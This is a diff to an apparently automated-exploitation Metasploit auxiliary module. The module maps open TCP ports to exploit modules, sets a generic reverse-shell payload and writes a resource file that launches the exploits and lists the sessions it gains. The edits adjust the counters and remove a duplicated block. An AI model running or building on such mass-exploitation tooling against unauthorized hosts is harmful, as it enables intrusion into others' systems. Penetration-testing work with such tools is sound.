@@ -48,7 +48,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('EXPLOIT_TIMEOUT', [true, "How long to wait before killing runaway exploits, in seconds", 60])
       ])
   $handler = 2000
-  $sploit_count = 0;
+  $sploit_count = 0
+  $port_count = 0;
   $done = 0;
 
   deregister_options('RPORT')
@@ -124,6 +125,7 @@ class MetasploitModule < Msf::Auxiliary
         $payl = "generic_shell_reverse"
         # use port scanning to build script here
         for openport in opentcp do
+          $port_count = opentcp.length
           msfmodules = []
           # find modules  and loop over them
           msfmodules = Find.find(datastore['LPATH']).select { |p| /.*\.rb$/ =~ p }
@@ -171,24 +173,12 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
       end
-    if $sploit_count < 1
+    if $port_count < 1
       print_error("Sorry, no exploits added.  Are there open ports?")
 
     end
       end
     # kill jobs and then list sessions
-if $done == 1
-      open('msfexec.rc', 'a') { |f|
-      f.puts("sleep #{datastore['EXPLOIT_TIMEOUT']}")
-      f.puts("jobs -K")
-      f.puts("sessions")
-    }
-    # run it!
-    if $sploit_count > 0
-    print_good("#{$sploit_count} exploits added to resource file... good.")
-    print_good("Now run 'resource msfexec.rc' to exploit hosts...")
-    end
- end
     open('msfexec.rc', 'a') { |f|
       f.puts("sleep #{datastore['EXPLOIT_TIMEOUT']}")
       f.puts("jobs -K")
